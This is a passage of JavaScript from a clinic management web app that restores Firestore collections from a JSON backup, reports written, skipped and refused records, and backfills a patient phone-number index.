                    batch.set(db.collection(name).doc(id), restoreValue(bucket[id]));
                });

                return batch.commit()
                    .then(() => { written[name] += chunks[c].length; })
                    .catch(err => {
                        if (err && err.code === "resource-exhausted") {
                            stoppedByQuota = true;
                            refused[name] = "resource-exhausted";
                            return;
                        }
                        // ── Fall back to one document at a time ────────────
                        // A batch is all-or-nothing, so a single refused
                        // document used to cost the other 399 in its chunk.
                        // Retry each alone and keep whatever the rules allow.
                        console.warn("Batch refused for " + name +
                                     " — retrying one document at a time:", err);

                        let salvaged = 0;
                        const lastError = { code: (err && err.code) || "denied" };

                        return chunks[c].reduce(
                            (chain, id) => chain.then(() => {
                                if (stoppedByQuota) return;
                                return db.collection(name).doc(id).set(restoreValue(bucket[id]))
                                    .then(() => { salvaged++; })
                                    .catch(e => {
                                        lastError.code = (e && e.code) || "denied";
                                        if (lastError.code === "resource-exhausted") stoppedByQuota = true;
                                    });
                            }),
                            Promise.resolve()
                        ).then(() => {
                            written[name] += salvaged;
                            if (salvaged < chunks[c].length) {
                                refused[name] = lastError.code;
                                partial[name] = (partial[name] || 0) + (chunks[c].length - salvaged);
                            }
                        });
                    })
                    .then(() => writeChunk(c + 1));
            };

            return writeChunk(0).then(() => restoreCollection(i + 1));
        });
    };

    setStatus('<p class="backup-progress">Opening restore mode…</p>');

    openRestoreMode()
    .then(mode => {
        if (!mode || !mode.open) {
            throw new Error("Restore mode could not be opened. Only the clinic owner's " +
                            "account can restore, and the security rules must be deployed.");
        }
        return restoreCollection(0);
    })
    .then(() => db.collection("restore_log").add({
        by: currentUserId,
        byName: currentUser || "",
        at: firebase.firestore.FieldValue.serverTimestamp(),
        backupFile: String(pendingRestoreFile || "").slice(0, 300),
        backupExportedAt: String(backup.exportedAt || "").slice(0, 40),
        written: written,
        skipped: skipped,
        refused: refused,
        replacedExisting: replaceExisting
    }).catch(err => console.warn("Could not write the restore log:", err)))
    .then(() => closeRestoreMode())
    .then(() => {
        refreshReference();   // every cached list is now stale
        setStatus(restoreReportHtml(written, skipped, refused, partial, stoppedByQuota, replaceExisting));
        showToast(stoppedByQuota
            ? "Restore paused at the free plan's daily limit. Run it again tomorrow."
            : "Restore finished. Read the report before closing this page.",
            stoppedByQuota ? "warning" : "success");
        pendingRestore = null;
    })
    .catch(err => {
        console.error("Restore failed:", err);
        closeRestoreMode();
        // Firebase's own words ("Missing or insufficient permissions") tell the
        // doctor nothing she can act on. A refusal here means one of two
        // things, and both are named. Nothing was written either way.
        const reason = err && err.code === "permission-denied"
            ? "The system refused to open restore mode. Restoring needs Dr. Gapit's own " +
              "account, and the clinic's updated security rules must be published first. " +
              "Nothing was changed."
            : err && err.code === "unavailable"
            ? "The internet connection dropped. Nothing was changed. Try again when the " +
              "connection is back; it only puts back what is still missing."
            : (err && err.message) || "Something went wrong.";
        setStatus('<p class="backup-warn"><strong>Restore did not run.</strong> ' +
                  escapeHtml(reason) + '</p>');
        showToast("Restore did not run. See the note on the panel.", "error");
    })
    .finally(() => { if (btn) btn.disabled = false; });
}

/**
 * A backup is plain JSON, so timestamps written by the server
 * (FieldValue.serverTimestamp()) come back as {seconds, nanoseconds} objects.
 * Turn those back into real Firestore Timestamps before writing, so a restored
 * document has the same shape as the one that was lost.
 */
function restoreValue(value) {
    if (Array.isArray(value)) return value.map(restoreValue);
    if (value && typeof value === "object") {
        const keys = Object.keys(value);
        if (keys.length === 2 && typeof value.seconds === "number" && typeof value.nanoseconds === "number") {
            return new firebase.firestore.Timestamp(value.seconds, value.nanoseconds);
        }
        const out = {};
        keys.forEach(k => { out[k] = restoreValue(value[k]); });
        return out;
    }
    return value;
}

/**
 * Four outcomes, not two. A collection that wrote 380 of its 400 rows is not
 * the same as one that wrote none, and "already there" is not the same as
 * "refused". During a recovery that difference is the whole report.
 */
function restoreReportHtml(written, skipped, refused, partial, stoppedByQuota, replaceExisting) {
    const names = BACKUP_COLLECTIONS.filter(n => written[n] !== undefined);

    const okRows = names
        .filter(k => written[k] > 0 && !refused[k])
        .map(k => '<li>' + escapeHtml(k) + ' — ' + written[k] + ' put back' +
                  (skipped[k] ? ', ' + skipped[k] + ' already there' : '') + '</li>')
        .join("");

    const alreadyRows = names
        .filter(k => !written[k] && !refused[k] && skipped[k])
        .map(k => '<li>' + escapeHtml(k) + ' — all ' + skipped[k] + ' already there</li>')
        .join("");

    const partRows = Object.keys(refused)
        .filter(k => written[k] > 0)
        .map(k => '<li>' + escapeHtml(k) + ' — <strong>' + written[k] + ' written, ' +
                  (partial[k] || 0) + ' refused</strong> (<code>' +
                  escapeHtml(refused[k]) + '</code>)</li>')
        .join("");

    const badRows = Object.keys(refused)
        .filter(k => !written[k])
        .map(k => '<li>' + escapeHtml(k) + ' — <code>' + escapeHtml(refused[k]) + '</code></li>')
        .join("");

    let html = '<p class="backup-ok"><strong>Restore finished.</strong> ' +
               (replaceExisting ? 'Existing everyday records were replaced with the backup\'s copy.'
                                : 'Only missing records were put back.') + '</p>';
    if (okRows) html += '<p>Put back:</p><ul class="backup-list">' + okRows + '</ul>';
    if (alreadyRows) html += '<p>Nothing missing:</p><ul class="backup-list">' + alreadyRows + '</ul>';
    if (partRows) {
        html += '<p class="backup-warn"><strong>Partly written:</strong></p>' +
                '<ul class="backup-list">' + partRows + '</ul>';
    }
    if (badRows) {
        html += '<p class="backup-warn"><strong>Refused entirely:</strong></p>' +
                '<ul class="backup-list">' + badRows + '</ul>';
    }
    if (stoppedByQuota) {
        html += '<p class="backup-warn"><strong>Stopped at the free plan\'s daily write limit.</strong> ' +
                'Everything above was saved. Run the same restore again tomorrow: it skips what ' +
                'is already back and continues with the rest.</p>';
    } else if (partRows || badRows) {
        html += '<p class="backup-note">A refusal here usually means restore mode had closed ' +
                '(it lasts 60 minutes) or the security rules on the live project are older ' +
                'than this app. Run the restore again; it only writes what is still missing.</p>';
    }
    return html;
}


/** Backup-panel elements live in one layout, but resolve them the same way. */
function backupEl(cls) {
    return document.querySelector(".app-layout:not(.hidden) ." + cls);
}

// ── Mobile numbers on file (2026-10-05) ───────────────────────────────────
//
// Fills phone_index for patients saved before it existed, so registration can
// warn about their numbers too (notePhoneOnFile in js/app.js). One read of the
// cached patient list, then one small read per distinct number, and a write
// only where a number is missing. Safe to run again. Dr. Gapit's and admin's.
let phoneIndexRunning = false;
function indexPatientPhones() {
    if (!canManageBackups() || phoneIndexRunning) return Promise.resolve();
    const btn = document.getElementById("backup-phones-btn");
    const status = document.getElementById("backup-phones-status");
    const say = text => { if (status) status.textContent = text; };
    phoneIndexRunning = true;
    if (btn) btn.disabled = true;
    say("Reading the patient list…");
    let added = 0;
    return getReference("patients")
        .then(byId => {
            const numbers = [];
            Object.keys(byId || {}).forEach(id => {
                [byId[id].phoneNumber, byId[id].signInPhone].forEach(value => {
                    const n = normaliseMobile(value);
                    if (n && numbers.indexOf(n) === -1) numbers.push(n);
                });
            });
            const step = i => {
                if (i >= numbers.length) return Promise.resolve(numbers.length);
                say("Checking number " + (i + 1) + " of " + numbers.length + "…");
                return notePhoneOnFile(numbers[i]).then(wrote => { if (wrote) added++; return step(i + 1); });
            };
            return step(0);
        })
        .then(total => say("Done. " + total + " mobile numbers on file; " + added + " added now."))
        .catch(err => {
            console.error("Could not update the mobile numbers:", err);
            say("Stopped after adding " + added + ". Check the connection and press it again.");
        })
        .then(() => { phoneIndexRunning = false; if (btn) btn.disabled = false; });
}
